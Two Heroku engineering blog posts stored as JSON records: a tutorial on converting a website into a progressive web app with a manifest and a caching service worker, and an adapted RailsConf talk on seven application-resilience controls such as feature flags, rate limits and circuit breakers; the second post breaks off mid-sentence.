{"website": "Heroku", "title": "How to Make a Progressive Web App From Your Existing Website", "author": ["Christine Dodrill"], "link": "https://blog.heroku.com/how-to-make-progressive-web-app", "abstract": "How to Make a Progressive Web App From Your Existing Website Posted by Christine Dodrill March 05, 2019 Listen to this article Progressive web apps enable websites to function more like native mobile apps in exchange for some flexibility. You get native mobile app functionality (or close to it) without all the overhead of app store approvals and tons of platform-specific native code. Users can install a progressive web app to their home screen and launch it just like a native app. However, the app is launched into a pseudo-app frame that has some restrictions and only allows access to pages that are sub-paths of the initial path of the progressive web app. They also must be served over HTTPS. The core of a progressive web app is the service worker , which is effectively a client-side JavaScript daemon. Service workers can listen for a few kinds of events and react to them. One of the most commonly supported events is the fetch event , which can be used to cache web content offline as explained below. Many websites fit just fine within the rules and restrictions of progressive web apps. Instead of waiting for Apple or Google to approve and push out native app updates, progressive web app updates are fetched by a service worker following standard HTTP caching rules . Plus, progressive web apps can now use many native APIs like the geolocation, camera, and sensor APIs that only native mobile apps used to be able to take advantage of. In this post, we’ll show you how to convert your existing website into a progressive web app. It’s fairly simple, only really requiring the following steps: Create an app manifest Add it to your base HTML template Create the service worker Serve the service worker on the root of the scope you used in the manifest Add a <script> block to your base HTML template to load the service worker Deploy your progressive web app Use your progressive web app! If you want a more guided version of this post, the folks at https://pwabuilder.com have created an online interface for doing most of the below steps automatically. Create an App Manifest An app manifest is a JSON file containing the following information: The canonical name of the website A short version of that name (for icons) The theme color of the website for OS integration The background color of the website for OS integration The URL scope that the progressive web app is limited to The start URL that new instances of the progressive web app will implicitly load A human-readable description Orientation restrictions (it is unwise to change this from \"any\" without a hard technical limit) Any icons for your website to be used on the home screen (see the above manifest generator for autogenerating icons) This information will be used as the OS-level metadata for your progressive web app when it is installed. Here is an example web app manifest from my portfolio site . {\n    \"name\": \"Christine Dodrill\",\n    \"short_name\": \"Christine\",\n    \"theme_color\": \"#ffcbe4\",\n    \"background_color\": \"#fa99ca\",\n    \"display\": \"standalone\",\n    \"scope\": \"/\",\n    \"start_url\": \"https://christine.website/\",\n    \"description\": \"Blog and Resume for Christine Dodrill\",\n    \"orientation\": \"any\",\n    \"icons\": [\n        {\n            \"src\": \"https://christine.website/static/img/avatar.png\",\n            \"sizes\": \"1024x1024\"\n        }\n    ]\n} If you just want to create a manifest quickly, check out this online wizard . Add the Manifest to Your Base HTML Template I suggest adding the HTML link for the manifest to the lowest level HTML template of your app, or, in the case of a pure client-side web app, its main index.html file, as it needs to be as visible by the browser client trying to install the app. Adding this is simple . Assuming you are hosting this manifest at the path /static/manifest.json , simply add it to the <head> section: <link rel=\"manifest\" href=\"/static/manifest.json\"> Create offline.html as an Alias to index.html By default, the service worker code below will render /offline.html instead of any resource it can't fetch while offline. Create a file at <your-scope>/offline.html to give your user a more helpful error message, explaining that this data isn't cached and the user is offline. If you are adapting a single-page web app, you might want to make offline.html a symbolic link to your index.html file and have the offline 404 be handled inside there. If users can't get back out of the offline page, it can potentially confuse or strand users at a fairly useless \"offline\" screen. This obviates a lot of the point of progressive web apps in the first place. Be sure to have some kind of \"back\" button on all error pages. In macOS and Linux, you can symbolically link offline.html to index.html like this: $ ln -s index.html offline.html Now we can create and add the service worker. Create the Service Worker When service workers are used with the fetch event , you can set up caching of assets and pages as the user browses. This makes content available offline and loads it significantly faster. We are just going to focus on the offline caching features of service workers today instead of automated background sync, because iOS doesn't support background sync yet (although things are moving in a good direction ). At a high level, consider what assets and pages you want users of your website always to be able to access some copy of (even if it goes out of date). These pages will additionally be cached for every user to that website with a browser that supports service workers. I suggest implicitly caching at least the following: Any CSS, JavaScript or image files core to the operations of your website that your starting route does not load Contact information for the person, company or service running the progressive web app Any other pages or information you might find useful for users of your website For example, I have the following precached for my portfolio site : My homepage (implicitly includes all of the CSS on the site) / My blog index /blog/ My contact information /contact My resume /resume The offline information page /offline.html This translates into the following service worker code: self.addEventListener(\"install\", function(event) {\n  event.waitUntil(preLoad());\n});\n\nvar preLoad = function(){\n  console.log(\"Installing web app\");\n  return caches.open(\"offline\").then(function(cache) {\n    console.log(\"caching index and important routes\");\n    return cache.addAll([\"/blog/\", \"/blog\", \"/\", \"/contact\", \"/resume\", \"/offline.html\"]);\n  });\n};\n\nself.addEventListener(\"fetch\", function(event) {\n  event.respondWith(checkResponse(event.request).catch(function() {\n    return returnFromCache(event.request);\n  }));\n  event.waitUntil(addToCache(event.request));\n});\n\nvar checkResponse = function(request){\n  return new Promise(function(fulfill, reject) {\n    fetch(request).then(function(response){\n      if(response.status !== 404) {\n        fulfill(response);\n      } else {\n        reject();\n      }\n    }, reject);\n  });\n};\n\nvar addToCache = function(request){\n  return caches.open(\"offline\").then(function (cache) {\n    return fetch(request).then(function (response) {\n      console.log(response.url + \" was cached\");\n      return cache.put(request, response);\n    });\n  });\n};\n\nvar returnFromCache = function(request){\n  return caches.open(\"offline\").then(function (cache) {\n    return cache.match(request).then(function (matching) {\n     if(!matching || matching.status == 404) {\n       return cache.match(\"offline.html\");\n     } else {\n       return matching;\n     }\n    });\n  });\n}; You host the above at <your-scope>/sw.js . This file must be served from the same level as the scope. There is no way around this, unfortunately. Load the Service Worker To load the service worker, we just add the following to your base HTML template at the end of your <body> tag: <script>\n if (!navigator.serviceWorker.controller) {\n     navigator.serviceWorker.register(\"/sw.js\").then(function(reg) {\n         console.log(\"Service worker has been registered for scope: \" + reg.scope);\n     });\n }\n</script> And then deploy these changes – you should see your service worker posting logs in your browser’s console. If you are testing this from a phone, see platform-specific instructions here for iOS+Safari and here for Chrome+Android . Deploy Your Progressive Web App Deploying your web app is going to be specific to how your app is developed. If you don't have a place to put it already, Heroku offers a nice and simple way to host progressive web apps. Using the static buildpack is the fastest way to deploy a static application (i.e. one that is only HTML, JavaScript, and CSS). You can look at my fork of GraphvizOnline for an example of a Heroku-compatible progressive web app. Note that if you deploy this, you will need to edit the start URL in the manifest to the URL that will reach the deployed website – for instance, sandy-beach-3033.herokuapp.com . Use Your Progressive Web App For iOS Safari, go to the webpage you want to add as an app, then click the share button. Tap the \"Add to Home Screen” button on the share sheet. The next dialog will let you name and change the URL starting page of the progressive web app before it gets added to the home screen. You can then launch, manage and delete it like any other app. For Android with Chrome, tap on the hamburger menu in the upper right-hand corner of the browser window and then tap \"Add to Home screen.” This may prompt you for confirmation, then it will put the icon on your homescreen and you can launch, multitask or delete it like any other app. Unlike iOS, you cannot edit the starting URL or name of a progressive web app with Android. After all of these steps, you will have a progressive web app. Any page or asset that users load will seamlessly be cached for future offline access. It will be exciting to see how service workers develop in the future. I'm personally excited the most for background sync – I feel it could enable some fascinatingly robust experiences. mobile javascript pwa", "date": "2019-03-05,"},
{"website": "Heroku", "title": "Seven Ways to Fortify Your Application", "author": ["Amy Unger"], "link": "https://blog.heroku.com/seven-ways-to-fortify-your-application", "abstract": "Seven Ways to Fortify Your Application Posted by Amy Unger March 20, 2019 Listen to this article This blog post is adapted from a talk given by Amy Unger at RailsConf 2018 titled \" Knobs, buttons & switches: Operating your application at scale .\" We've all seen applications that keel over when a single, upstream service goes down. Despite our best intentions, sometimes an unexpected outage has us scrambling to make repairs. In this blog post, we'll take a look at some tools you can integrate into your application before disaster strikes. We'll talk about seven strategies that can help you shed load, fail gracefully, and protect struggling services. We'll also talk about the technical implementations of these techniques—particularly in Ruby, though the lessons are applicable to any language! All right. Well, thank you everyone. I'm glad you're here. I hope you enjoyed the cheesecake, and I hope it doesn't put you to sleep. I'm Amy. I'm a backend engineer at Heroku, and I'm talking about how you can add knobs, buttons, and switches to your application to make it alter its behavior when things go wrong. We've all seen applications that can keel right over when a single unimportant service is down. So, let's not have that be you. All right. Pilots operate their airplanes from the flight deck and I have fond memories of Captain Kirk yelling every week to divert power to the shields. This talk is about what kinds of levers you should have for operating your application when the going gets tough. I want you to feel like when you're on call you have that level of control over your application. So, this means that this talk is about application resilience. But it's only one part of the topic. This is what I call the just right talk for the, well, not just right fires. But it is not about the baby fires. These are your casual, everyday failures. No one action that you take on behalf of a customer has a 100% chance of succeeding. Maybe they provided bad data. Maybe there's some conflicting state, whether that's between you and another service or between two other dependent services. Maybe that customer has a found a particular race condition or you've hit a network blip. Whatever the reason, that request and many others like it may not succeed, but those are not what I'm talking about today. So, this talk assumes that you have functionality for retrying requests, unwinding multi-step actions when you hit a snag six steps in. I've talked about those strategies at a previous Rails Conf, and I wanted to highlight them because they will probably give you more bang for your buck depending on where you're at. I'm also not talking about disaster recovery scenarios, those business ending, terrible, horrific, catastrophic events. Something like, I'm sorry, your database is gone. All back ups have been lost, and aliens have abducted all of US east. Good luck. So, while this is the just right talk it may be more useful for you at this moment to work on failures that are happening quietly right now or to plan for the ones that you hope will never happen, but might end your business. And while this is the just right talk, the entire talk may not be just right for you. I've been lucky enough to work at companies that cared deeply about providing a great, reliable, and resilient customer experience. But how we provided those services to customers reflects what we value. When you have to make a difficult choice about what you choose to do under bad situation, or under bad circumstances, that choice is very particular to the size of the application, your customer base, and your product. So you may end up asking your product people, even your business owners, what do you want me to do in this situation? So, what am I talking about? I'm talking about strategies that can help you shed load, fail gracefully, protect struggling services, and we'll talk about these seven tools that will help you do that. I'll go into some implementation details for each and then I'll give you some buyer beware warnings at the end. So, let's jump right in. The first tool I wanna talk about is maintenance mode. Going into maintenance is your hard nope, your fail whale. It should have a clear, consistent message with a link to your status page, and most importantly it should be really easy to switch on. At Heroku, we have this implemented as an environment variable. The key thing here is that it's one button you can press and not a series of levers and dials. You should not have to follow a very long play book in order to get this working for you. The next one I wanna talk about is read-only mode. So, most pieces of software effect, they exist to effect some sort of change in another system. I'm guessing for most of us since it is RailsConf that work that our application performs is to alter a relational database. But it could be any series of things. Think about what your application does for users and whether that's store data in the database, right, transform files, upload them into a file store, or for us they're for GUI launch containers on EC2 instances. Once you have an idea of what your application is modifying think about what you can do if you can't modify that. What questions can you answer? Some of you may be operating a very narrowly scoped service, and the answer may be nothing, and that's fine. This is not the tool for you. But if you're at the classic Rails blog size, maybe larger, this could be very useful. Most people probably just want to read your blog. They don't want to alter it. They don't--they're not publishing. And then for my job currently the primary application I work on has a variety of disparate services. So we need finer grain tools. So this, this is not quite the tool for us, but it's a good first step. Again, the way we would probably implement this is through an environment variable and that's mostly just because it would have similarity to the maintenance mode. But, you know, consider what tool you want to use and use it consistently. Next, feature flags. So, feature flags can be used for more than just new features. They can allow you to provide a controlled experience when part of your app isn't working. So, imagine what if billing or selling new things was a new feature flag for you? There are different levels of feature flags that we find useful. First is the user, the individual feature flag. This probably isn't very helpful for you during an incident. Hopefully your incidents aren't called just for one user. There's the global level, application wide. So, as I mentioned, what if billing globally was a feature? For us that might be also like freezing modifications to all the containers we're running for customers. But what we really find useful is the group level. So, at Heroku we run users' applications on our platform. So for us, the most relevant groups are usually groups of applications running in a particular region. They might also be groups of applications written in Go or Ruby. You'll want to think about what groupings are meaningful for your business because it really ends up being a combination of what you want to control and who your users really are. So the way we implement this is we have a class that can answer these questions about current application state. This could be a normal active record model talking to a relational database. For us, that is currently what this particular class does talk to, it does talk to our database. But that's not necessarily the right choice for you. This model could be backed by talking to Redis. It could be talking to an in-memory cache. Of course an in-memory cache would mean that for each different web process it would have different application state, which might be more complicated than you want. One of the most interesting options I could think of was curling a file named billing enabled in a particular S3 bucket. If that is what you need to do in order to make sure that this check doesn't fail when the thing you're trying to handle the failure of also fails. Sorry. Too many failures in that sentence. But, you would want to choose something that is going to be able to answer the question of am I down if the thing you're trying to control is also down. For groups, so the previous one we looked at was billing enabled, and this right now would be looking at the setting for billing for our EU customers. So, for groups I really recommend having one switch for an entire group. It may seem silly to have these strings, just tons of them, and this may not be your experience, but at two AM we find that strings really are easier to copy and paste rather than trying to instantiate an application setting model for billing, and then say that it's for the US group and then, you know, toggle the enabled flag. Just a string works a little bit better for us, and really gives us more confidence that when we ask what the current state of the application is we know exactly what we're getting. Next I wanna talk about rate limits. So, rate limits protect you from disrespectful and malicious traffic. But they can also help you shed load. So if you need to drop half of your traffic to stay up you should drop half your traffic. Your customers, that respectful traffic, they may have to try two or three times to get a particular request through. But if they keep trying they'll be able to do what they need to do. We see this strategy from AWS all the time. When we get to the, when we understand that we are in that state, that they are rejecting a fair number of requests because they are under some sort of load, we start behaving in a way that is helpful to them and to us. We stop sending excess traffic and we start repeating our single most important request to them and then our second-most important request. Eventually it gets through. Eventually that most important request to them will be accepted by them and during that period we won't have been sending them tons and tons of traffic. Rate limits can now also help you protect access to your application from other parts of the business that rely on you. Oftentimes the single application that a user sees is actually a mesh of assorted different services all acting together to create a single user experience and while perhaps you can, I mean, you absolutely can make that internal system function when other parts of it are down, it can be easier to just really try to protect that preferred traffic in addition to the strategies here which will help you stay up even if parts do go down. So, if you can prefer your internal traffic it can help continue to present that unified front to customers and keep you looking up for longer. So, we implement rate limits as a combination of two different kinds of levers, single default, and many modifiers for user accounts, and we find that this gives us the flexibility to provide certain users the rate limits that they need while at the same time retaining a single control for how much traffic we are able to handle at any one point. So, where we start is again an application setting. This is a global default of a rate limit. Here we're saying it's 100 requests per minute. Hopefully we can handle more than that, but let's just say that for easy math. And we have our customer here. Our customer starts with a modifier of one, and what this means is that to determine the customer's rate limit we will multiply the default, 100, by their modifier of one, which results in a rate limit as you might expect, oh, sorry, there we go, of 100 requests per minute. Now, let's say this customer writes in and says, hey, you know, I really have these legitimate reasons that I need twice as much traffic. We say, great. We'll bump you up to two, to a modifier of two, which means at the end of the day they get a rate limit of 200 requests per minute. Some time later we end up under a lot of load and we're not able to keep up and we make the tough choice to say, hey, we need to cut our traffic. And so we cut the default rate by half. So this used to be 100. We're now at 50. But what this means is that all of our customers, all of our accounts actually, including the preferred internal accounts, can in one setting be cut in half. So, our customer here is back at 50% of his or her rate limit, 100 requests per minute. But that's still a little bit above or significantly above the default. So it allows us to rapidly cut traffic coming in, without having to run a script over every single user to adjust their rate limit. I should mention that depending on your application you may want to consider doing cost-based rate limiting. That may be a far better choice instead of doing request based rate limiting. So, in cost-based rate limiting you're going to charge a user a number of tokens depending on the length of their request, so that they can't call your really slow end points as frequently as your blazing fast end points. This is helpful if you're doing request based rate limiting and then you drop your users to maybe to again 50% of normal traffic, but they're still hitting that one horribly un-performing reporting end point because it's the end of the month and everybody needs their stuff. You could still be under excess load and you might want to consider cost-based limits if you have a lot of reporting end points that really tax your application at particular times. Finally, it may seem counter-intuitive but the more complex the algorithm for rate limiting the worse off you will be for denial of service attacks. The more computation time it takes for you to say that you can't process a request, the worse off you are when you're dealing with a flood of requests. This is no reason to not implement some complex rate limiting if you need it, but it is a reason to make sure you have other layers in place to handle distributed denial of service attacks and honestly even the denial of service attacks that happen by mistake when someone just makes up, deploys a bug, and you're getting hit over and over again. All right, next, stopping non critical work. So, let's say you're hitting limits on your database, maxing out your compute, hitting the limits of some other dependent service. You should be able to stop any reports, any cleaners, any jobs that are making this worse that don't have to happen in the next hour, or maybe don't have to happen in the next four hours. You should be able to just turn them off. So, how do we do this? So, like application setting we have report setting as a model here. Similarly, it takes a string and what we do is we make sure that every report and every job checks to make sure that it is enabled before it runs. So, let's look at a quick code example. So, let's say we have a monthly user report, and that responds to a run method, and it's gonna do something. Who knows what it does, but it has a decent chance of being very intensive. All right, so, before we do any work we're gonna check to make sure that we're enabled. For our monthly user report, we're going to implement a method called enabled. We're going to check report setting and see if this particular report is enabled at this time. But let's make this a little more general. So, let's make your monthly user report inherit from report and then let's say monthly user report is really just responsible for building itself. It doesn't know much else. It's not really gonna be responsible for knowing where it's gonna run, whether it should run. It just can build its report, which means the parent class report will then get a bunch of additional features, so it knows how to respond to run and it can figure out if its child class is enabled. So, this is really useful for reports and jobs. Having this just standard means that any time a user creates a new job it is by default able to be enabled or disabled with one change to, in our case, the database, that Redis, that S3 bucket, whatever you wanna do. So next, known unknowns. So, I am confident that all of you have never shipped non performing code, ever. But I definitely have. The SQL that you're shipping that you don't know how it will perform for your biggest customers, that you might wanna have it under control if it does go haywire. We have plenty of new features that go out that we think are fine. We've done as much testing as we think is reasonable but there's still, you know, the hair on the back of your neck. So, if you're scared of it, put a flag around it. If it's a new feature we'll put it in a feature flag. It's pretty straightforward and we covered that a little bit already, but if it's a refactor we usually have anything scary go out within GitHub Scientist. So using Scientist allows us to gradually roll out changes--refactors--but it also allows us to enable or disable the experimental code immediately if we see any problems. And the great thing is because it's so fast to disable we can do it even before we're 100% confident that this is what's causing issues, and the beautiful thing about having so many things configurable is if you have a little bit of doubt you can just turn it off and we find that eliminating those rabbit holes, things that might take one person an hour during an incident to look into, to prove that that's not it, is really helpful. We all have biases that, you know, I know that person's code. That's not gonna be, and that has to be it, or maybe it's just that a change went out right at the time that you saw the issue. Being able to turn suspect things off is a really great tool to moving you closer to the real problem faster. All right, finally, I wanna talk about circuit breakers. So, circuit breakers allow you to be nice to the services that you depend on. They allow you to be a good neighbor. They allow you to not break them and they allow you to not swamp those services as they're just recovering. So, circuit breakers typically are responsive s. So, responsive shutoffs look at all of the calls you're making to a particular service and they can be configured to look at particular metrics. So whether that is the number of timeouts over the course of five minutes or maybe it's a 50% error rate over 10 minutes, whatever you've configured them to look for, responsive shutoffs can automatically kick in and back off any calls to those services. That gives those dependent services, or services you're depending on, time to recover but it also frees up your web processes to not spend the time calling down to a service that is most likely failing. Responsive shutoffs work far faster than any monitoring service. They can go through paging your on-call person, getting them awake, getting them on their computer, and then having them look up the right playbook and then take action. So, the hope is that by the time you page in the on-call person the responsive shutoff has already kicked in and you're in a better failure mode. But you can also use circuit breakers in a hard or manual shutoff. So, this would help you specifically keep traffic away from a struggling service. In some cases, you might want to allow high latency. Let's say, you know, maybe you have a 29 second request to a service every once in a while. You don't want that kind of request to trip the circuit breaker. But that does mean that if that service is in a high latency state where it's taking 29 seconds to respond to every single one of your requests, that means you're probably grinding to a halt, since your web workers are going to be tied up trying to resolve those downstream calls on behalf of your customers and not servicing the massive backlog of requests that you have coming in. So, in that case, while you wouldn't want a circuit breaker to automatically trip, you may want to manually turn it off. The other nice thing, or the other use for these manual shutoffs is a misbehaving service. This is usually for internal services where engineers can be a little more honest with each other. If you have an internal service that's responding 204 and you know it's just dropping requests on the floor a 503 error can actually be better for your customers than allowing those two services to drift out of state or telling your customers that something's gonna happen and it never does. So, these would work in a similar way that our monthly billing report worked. In the same way that monthly billing report inherited from a report class, our billing service client would inherit from a client class that would set up by default circuit breakers for any of its children and would keep track of those individual circuits, again, backed by anything you want, whether that is, you know, in-memory state, shared cache, data store. There are a number of good circuit breaker gems out there that you can just include and will have support for this, and, so, I won't get into implementation too much just because please go read their READMEs. They're lovely. With all these approaches, I would highly recommend writing tools to manage these circuit breakers that do not assume a developer typing into a production console as I have here. A case in point. How many of your on-call engineers know and remember enough about electrical engineering at two AM to confidently remember whether open means sending requests or not? If you watch me giving this talk at RubyConf Australia these will be flipped because I did not remember. So in this case a circuit being open would mean that communication to the service is closed. So, I would highly recommend writing a tool that allows your on-call engineers to see whether a service is off and turn it off or on or some other vocabulary that is universal and hard to misconstrue, hopefully not at two AM, but if needed, at two AM. All right, so I wanna talk a little bit about implementation. With all these buttons and switches you really want to consider carefully how you form them and where you store their state. You have a number of options, some of which I have listed here. You can store them in a relational database, a data caching layer, in environment variables. You can even have them in your code as a last resort if you think that, you know, a way to control for failure is a deploy, then absolutely. Have a place in your code that it has a comment that says, hey, change this line, and then push it out to production as quickly as you can. For us, we're a deployment platform running on a deployment platform. So usually that option is not available to us. But it gets at this point of consider whether flipping a switch would require access to a component that could be down in a way that you would want to use the switch to control. So it doesn't require access to a running production server and what happens if you can't communicate to the running production server? How might you change the behavior of your application if you can't deploy changes? If you have a mutable infrastructure that might mean environment variables are totally out of the question for handling certain failure cases. One of the reasons why we rely so heavily on databases for storing our application state is because we have high confidence that our wonderful Postgres team, thank you, Gabe, will be able to get us access to the database in order to manually run SQL statements to flip certain bits and in many cases that would be how, instead of the lovely Ruby code, in many cases our failure states would end up being us running SQL in order to flip a switch to allow our running, still running, but behaving poorly, application to discover those changes. So, a final note is to really consider how, how much work it would take to figure out if a switch is flipped or not, because in general the fancier and more sophisticated your switch is the more likely it is to become part of the problem, or to confuse your engineers such that it is eventually the entire problem. And with that, I promised you some buyer bewares, some caveats. So, here they are. First is about visibility. So, you remember this picture? Yeah, so we've built a lot of knobs and switches in this talk but you haven't actually seen the dashboard. That's because you'll need to build one. Whether it has a lot of pretty graphics or just command line output, having something that can pull the different places where you're storing the state for your buttons and switches and combining it into one comprehensible place is really important for incident operations. Clearly understandable is not a bar that we meet at the moment, but we can discover the state of every single switch, even if it's just, it's way too much output. But we're working on that. Next, does it actually work? How many of you have tested your smoke detectors in the last month? Excellent, all right, congrats, Gabe. You may end up being surprised at your dependencies and more interestingly you may actually be surprised at the dependencies that your dependencies have, especially if those, if you're working with vendors. They might be running on the same infrastructure that you are. So if it's a critical switch perform game days. You really don't have the confidence to know that it will work until you have, you've really tried it. Of course with that mention of vendors, right, you can try to turn off certain things but if you don't have complete confidence about what other people's work is built on it can be really hard to kind of tease out what exactly you need to turn off in order to simulate a complete outage of a particular component. So, this leads me to my next and final point. You're really trading knowledge for control here. The more configurable you make your application at runtime the less confident you can be that it will work in predictable ways. Have you tested for this user when flagged into three things, flagged out of two, and with a service shutoff? I'm guessing not, and if you did test that I'm questioning the size of your test suite. And more than just unit tests, keeping production, staging, and development environments in the same state has been a problem for many of the teams that I've worked on and I don't know of a good solution. And yet, while you are trading knowledge for control I'd still take this deal any day. I'd rather have control over my app to mitigate issues than to know confidently the exact and particular way that app is down and have no way to do anything about it. So that, thank you. I hope that this has given you some ideas about ways you can make your application a little bit more resilient to the fires you inevitably will see. I do work at Heroku. We have two lovely other speakers. Stella starts tomorrow morning right after the keynote, followed up by Gabe. So if you wanna learn about using Kafka in Rails or how Reddit, sorry, Postgres 10 is gonna make your life awesome, please check us out there, and obviously come by our booth which opens tomorrow as well. So, thank you, and I am happy to take questions for seven-ish minutes, or have you all disperse. Thank you. Yes, yup, yup, yup. So, the question is when do we start thinking about adding in a new knob or switch? Usually after an incident. Some of them are longer term, more thoughtful, more thoughtful things. But, yeah. At this point, most of the new ones are something went wrong and we didn't have the ability to control it, so we don't wanna have that happen again. Yup, how do we train new developers? I think that ties into how do we on-board people into on-call. So, we rely on a couple things. First of all, shadowing. We really do try to get people comfortable with the idea of being on-call by having them shadow on-call engineers during the day. So, they're not getting any pages, but they're, they're in there. They're, you know, seeing the person's screen. We do have documentation, but honestly that's one of, if you're in a really tired state the likelihood that you are going to think oh, let me read through these 50 pages of documentation is next to nothing. So we really want to get people to the point that they know what they're searching for through our docs and through, I mean, hopefully with a playbook it's a little bit more directed. You know which ones you're looking for. But again, if you're in the kind of an information discovery phase during the incident process, we're probably four or five hours in. So yeah, lots of, lots of shadowing, encouragement to read the docs, and then a strong reliance on telling people they really should just page someone. As the secondary for a new person going on primary I am more than happy to be woken up. It just, it needs to happens every once in a while and I want them to feel supported. So, making sure that they are totally okay regardless of the hour and that I am relatively chipper when I am in fact paged in is really important to us. So, yeah. No magical system to it, but just making sure people feel confident and aware of things. Where do we store state? Okay, so, as I mentioned we primarily store state in Postgres for us and also in Redis, because again, we have confidence that our data team is, just because of our infrastructure is relatively separate enough that if something catastrophic has happened to us most likely they're gonna be able to get us in. All right, well, I see people queuing at the back for the next talk, so thank you very much everyone. Yeah. 1. Maintenance mode Transforming your application from a live, active site into a single, downtime page is too large a hammer for many applications. However, it can also be the only choice to make when you're not certain what the actual problem is and it can also be the perfect tool for a smaller application or microservice. Therefore, it should be one of the first safeguards to build. When you've gone into maintenance mode, your site should have a clear message with a link to a status page, so that your users know what to expect. More importantly, maintenance mode should be really easy to toggle. At Heroku, we have this implemented as an environment variable: MAINTENANCE_MODE=on While there are many ways to implement this mode, your implementation should be easy for your application operators to toggle whether it’s 2pm or 2am! 2. Read-only mode For applications which modify any data, read-only mode helps preserve a minimum amount of functionality for your users and give them confidence that you haven’t lost all their information. What this looks like depends on what functions your application provides to users. Perhaps it stores data in the database, uploads files to a document store, or changes user preferences held in a cache. Once you know what your application is modifying, you can plan for what would happen if a user can't modify it. Suppose there's a sharp increase in replication lag from a bad actor, and all of your users can no longer make any changes on your site. Rather than take the whole application down, it may be better to enter a read-only mode. This can also be set as a simple environment variable: READONLY_MODE=on Customers often appreciate a read-only mode over a full-blown maintenance mode so that they can retrieve data and know which of their most recent changes went through. If you know that your site is still able to serve its visitors, your read-only mode should indicate via a banner (or some other UI element) that certain features are temporarily disabled while an ongoing problem is being resolved. 3. Feature flags Often, feature flags are introduced as a means of A/B testing new site functionality, but they can also be used for handling incidents as they occur. There are three different types of feature flags to consider: User-level: these flags are toggled on a per-user basis. During an outage, they're probably not very useful, due to their narrow effect. Application-level: these flags affect all users of your site. These might behave more like the maintenance mode and read-only mode toggles listed above. Group-level: these flags only affect a subset of users that you have previously identified. When it comes to incident handling, group-level feature flags are the most useful of the three. You'll want to think about what groupings are meaningful for your application; these end up being a combination of what you want to control and who your application’s users are. Suppose your application has started selling products to a limited number of users. One evening, there's a critical issue, and the feature needs to be disabled. We implement this at Heroku within the code itself. A single class can answer questions about the current application state and toggled features: ApplicationSetting.get('billing-enabled')\n=> true This ApplicationSetting model could be backed by a database, by Redis -- whatever provides the most resiliency to make sure that this check doesn't fail. Depending on your company’s need for stability, it may make sense to further subdivide into smaller segments. For example, perhaps your EU users have an entirely different feature flag for billing: ApplicationSetting.get('billing-enabled-eu')\n=> false For earlier-stage companies, it may be silly to have so many levels of refinement, but if your directive is to shave customer impact down by tenths of percentages, you'll be grateful for the confidence about which segment of the application is being affected! 4. Rate limits Rate limits are intended to protect you from disrespectful and malicious traffic, but they can also help you shed load. When you are receiving a mixture of normal and malicious traffic, you may need to artificially slow down everything while getting to the problem's source. If you need to drop half your traffic, drop half your traffic. Your legitimate users may need to try two or three times to get a particular request handled, but if you make it clear to them that your service is unexpectedly (but intentionally!) rejecting a fair number of requests because it's under some sort of load, they will understand and adjust their expectations. Rate limits can also protect access to your application from other parts of your business that rely on your service. Often, the single application that a user sees is actually a mesh of different services all acting together to create a single user experience. While you absolutely can make that internal system function when other services are down, it can be easier to just prioritize internal requests over external ones. At Heroku, we implement rate limits as a combination of two different kinds of levers: a single default for every account, plus additional modifiers for different users. We find that this gives us the flexibility to provide certain users the rate limits that they need, while at the same time retaining a single control for how much traffic we are able to handle at any one point. We set this value as an application setting with a global rate limit default: ApplicationSetting.set('default-rate') = 100 Here, we're assuming it's 100 requests per minute—hopefully your site can handle much more than that! Next, we assign all the users a default modifier: user.rate_limit_modifier\n=> 1.0 Every user starts with a modifier of one. To determine the customer's rate limit, we will multiply the application default by their modifier in order to determine what their rate limit ought to be: user.rate_limit\n=> 100.0 # requests per minute Suppose a power user writes in to support and provides legitimate reasons for needing twice the rate limit. In that case, we can set their modifier to two: power_user.rate_limit_modifier\n=> 2.0 This will grant them a rate limit of 200 requests per minute. At some point, we might need to cut down our traffic. In that case, we can cut the rate limit in half: ApplicationSetting.set('default-rate') = 50 Every user now has their default rate limit halved, including the power user above. But their value of 100 is still a little bit above than everyone else's default of 50, such that they can continue on with their important work. Setting limits like this allows us to rapidly adjust traffic coming in without having to run a script over every single user to adjust their rate limit. It's important to note that, depending on your application, you may want to consider doing cost-based rate limiting. With a cost-based rate limiting system, you \"charge\" a user a number of tokens depending on the length of their request, such that they can't call your really slow endpoints as frequently as your blazing fast endpoints. Finally, it may seem counter-intuitive, but the more complex the algorithm for rate limiting, the worse it will be during denial of service attacks. The more computation time it takes for you to say that you can't process a request, the worse off you are when you're dealing with a flood of them. This is no reason to not implement sophisticated rate limiting if you need it, but it is a reason to make sure that you have other layers in place to handle distributed denial of service attacks. 5. Stop non-critical work If your application is consistently pushing up against the limits of its infrastructure, you should be able to pull the plug on anything that isn't urgent. For example, if there are any jobs or processes that don't need to be fulfilled immediately, you should just be able to turn them off. Let's take a look at how that can be accomplished in the context of a function which generates a monthly user report: class MonthlyUserReport\n def run\n   do_something\n end\nend do_something has a decent chance of being very computationally expensive. We can instead rework this class to first assert that reports can be generated: class MonthlyUserReport\n def run\n   return unless enabled?\n   do_something\n end\n\n def enabled?\n   ReportSetting.get(\"monthly_user_report\")\n end\nend Now, before we do any work, we can check to make sure the generation is enabled. Just like the application settings above, we have ReportSetting defined as a model here: ReportSetting.get(\"monthly_user_report\")\n=> false We can also generalize this implementation. Let's make the monthly user report inherit from a parent Report system: class MonthlyUserReport < Report\n def build\n   do_something\n end\nend Now, the monthly user report is only responsible for performing the build, and the parent class is responsible for figuring out whether or not the job ought to run: class Report\n def run\n   return unless enabled?\n   build\n end\n\n def enabled?\n   ReportSetting.get(self.class.underscore)\n end\nend 6. Known unknowns Sometimes, observing the effects of a new change will be beyond the scope of a feature flag. Even if you believe that all your tests are flawless, you still carry doubt knowing that a disastrous outcome is looming in the shadows. In these cases, you can use a control/candidate system such as Scientist to monitor the behavior of both the new and the old code paths. Scientist allows you to gradually roll out changes and refactors. It also allows you to enable or disable new or experimental code immediately if there are any problems. Being able to turn suspicious code paths off one-by-one is a really great tool to moving you closer to the real problem faster. 7. Circuit breakers Circuit breakers allow you to play nice with the services that you depend on. These are typically responsive shut offs that safeguard interactions between services under dire situations. For example, if the number of 500 errors you see from a service in the last 60 seconds passes a threshold, a responsive shut off can automatically step in and halt any calls to those struggling services. This gives those dependent services time to recover, but it also frees up your web processes from spending the time calling a service that is most likely failing. A responsive shut-off works far faster than any monitoring service. A monitoring service may page your on-call engineer, which prompts them to go to their computer, then search for the right playbook, and then finally take action. By the time the original page was sent to a human, your responsive shut off has already kicked in and you're in a better failure mode. A circuit breaker could work in a similar way that the monthly billing report worked. Just as the monthly billing report inherited from a parent Report class, a billing service client could inherit from a Client class that would set up by default circuit breakers for any of its children. Further considerations There are a number of additional caveats you may want to investigate. The first one is 